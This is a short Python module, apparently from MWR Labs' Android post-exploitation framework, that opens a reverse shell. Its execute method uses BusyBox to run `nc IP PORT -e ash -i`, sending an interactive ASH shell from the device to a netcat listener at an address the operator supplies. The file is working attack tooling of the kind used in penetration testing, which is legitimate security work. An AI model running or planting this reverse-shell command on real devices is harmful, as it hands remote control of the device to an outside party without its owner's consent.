from mwr.droidhg.modules import common, Module

class Send(Module, common.BusyBox, common.FileSystem, common.Shell):

    name = "Send an ASH shell to a remote listener."
    description = """Send an ASH Shell to a remote listener.

This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send an ASH shell to a netcat listener."""
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["shell"]

    def add_arguments(self, parser):
        parser.add_argument("ip", help="ip address of the remote listener")
        parser.add_argument("port", help="port address of the remote listener")

    def execute(self, arguments):
        if self.isBusyBoxInstalled():
            self.busyBoxExec("nc " + arguments.ip + " " + arguments.port + " -e $BB ash -i")
        else:
            self.stderr.write("This command requires BusyBox to complete. Run tools.setup.busybox and then retry.\n")
            
